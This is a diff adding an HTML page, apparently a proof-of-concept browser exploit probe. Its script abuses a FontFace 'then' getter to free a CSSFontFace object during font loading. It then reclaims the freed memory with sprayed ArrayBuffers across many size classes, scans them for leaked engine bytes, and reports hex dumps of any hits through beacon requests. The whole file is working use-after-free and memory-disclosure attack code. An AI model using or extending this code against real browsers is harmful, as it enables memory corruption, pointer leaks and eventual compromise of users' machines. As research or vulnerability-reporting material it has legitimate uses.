@@ -1,0 +1,71 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf2</title>
+<script>
+/* Free the FontFaceSet's CSSFontFace (style removed inside the `then` getter),
+   reclaim the chunk with zero-filled ArrayBuffers of a known size class, then
+   report the first NONZERO byte any of them received. An ArrayBuffer starts
+   zeroed, so a nonzero byte is the engine writing into memory we own — the one
+   shape of leak that hands JS a pointer. Arm C skips the removal (no free). */
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var SIZES = [48,64,96,128,192,256,384,512,768,1024,1536,2048];
+var KEEP = 8, TRIAL = 0, MAXT = 0, styleEl = null, firedHere = false;
+var BUF = [], VIEW = [], THIS = 0, ARM = 'A';
+function setup(){
+  var name = 'u' + TRIAL, size = SIZES[TRIAL % SIZES.length];
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = window.__alive || [];
+  window.__alive.push(A);
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: t" + TRIAL + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  BUF = []; VIEW = []; THIS = TRIAL;
+  b('U2-T' + TRIAL + '-S' + size + '-SETUP');
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      b('U2-T' + TRIAL + '-G-ENTER');
+      if (ARM !== 'C' && styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < KEEP; i++) { BUF.push(new ArrayBuffer(size)); VIEW.push(new Uint8Array(BUF[BUF.length - 1])); }
+      b('U2-T' + TRIAL + '-G-ALLOC-' + BUF.length);
+      try { document.fonts.check('1em t' + TRIAL); } catch (e) {}
+      return undefined;
+    },
+    set: function(){}
+  });
+  try {
+    var pr = document.fonts.load('1em ' + name + ', t' + TRIAL, 'AB');
+    pr.then(function(){ b('U2-T' + TRIAL + '-RESOLVED'); scan(THIS); next(); },
+            function(){ b('U2-T' + TRIAL + '-REJECTED'); scan(THIS); next(); });
+  } catch (e) { b('U2-T' + TRIAL + '-LOAD-THROW'); }
+  setTimeout(function(){ if (firedHere) scan(THIS); }, 0);
+  setTimeout(function(){ if (firedHere) scan(THIS); }, 120);
+  b('U2-T' + TRIAL + '-LOAD-CALLED');
+}
+function hex(v){ return ('0' + v.toString(16)).slice(-2); }
+var SCANNED = -1;
+function scan(t){
+  if (t !== THIS) return;
+  var size = SIZES[t % SIZES.length], hits = 0, first = null, total = 0;
+  for (var i = 0; i < VIEW.length; i++) {
+    var v = VIEW[i], n = 0;
+    for (var j = 0; j < v.length; j++) { if (v[j] !== 0) { n++; if (!first) first = { b: i, o: j, v: v[j] }; } }
+    if (n) { hits++; total += n; }
+  }
+  if (total === 0) { if (SCANNED !== t) { SCANNED = t; b('U2-T' + t + '-CLEAN'); } return; }
+  /* dump 24 bytes from the first hit */
+  var s = '';
+  for (var j = first.o; j < first.o + 24 && j < size; j++) s += hex(VIEW[first.b][j]);
+  if (SCANNED !== t) { SCANNED = t; b('U2-T' + t + '-HIT-buf' + first.b + '-off' + first.o + '-' + s); }
+  else { b('U2-T' + t + '-MORE-nz' + total); }
+}
+function next(){ TRIAL++; if (TRIAL < MAXT) setTimeout(setup, 200); else b('U2-DONE-' + ARM); }
+function run(){ MAXT = SIZES.length; b('U2-PARSE-' + ARM); setup(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>uaf2</p></body></html>
